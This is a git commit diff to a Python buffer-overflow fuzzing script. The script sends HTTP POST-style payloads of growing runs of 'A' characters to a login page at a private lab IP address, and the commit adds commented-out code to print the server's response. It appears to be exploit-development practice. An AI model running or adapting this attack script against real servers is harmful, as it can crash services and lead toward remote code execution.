6a7ecc01fcb4f11fa48b826110bcaab5e8fd89c6
vidura-supun <vidurasupun@gmail.com>
2023-02-18 20:13:49 +0400

    Update Buffer_Overflow_Post.py
    Added troubleshooting by viewing response

--- Buffer_Overflow_Post.py
+++ Buffer_Overflow_Post.py
@@ -3,7 +3,7 @@ import socket
 import time
 import sys
 
-size = 100
+size = 800
 host = "192.168.127.10"
 buffer = "A"*size
 uri  = "login"
@@ -32,12 +32,23 @@ print(payload)
 
 while(size < 2000):
   try:
-    print("Sending Buffer" + str(size))
+    print("Sending Buffer" + " " + str(size))
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.127.10", 80))
-    s.sendall(payload)
-    ##print(s.recv(4096))
+    s.send(payload)
+    '''while True:
+      data = s.recv(4096)
+      if not data:
+        break
+      response += data
     s.close()
+    headers, body = response.split(b"\r\n\r\n", 1)
+    header_lines = headers.decode('iso-8859-1').split("\r\n")
+    for line in header_lines:
+      print(line)
+    
+    # Print the response body
+    print(body)'''
     size += 100
     time.sleep(10)
     
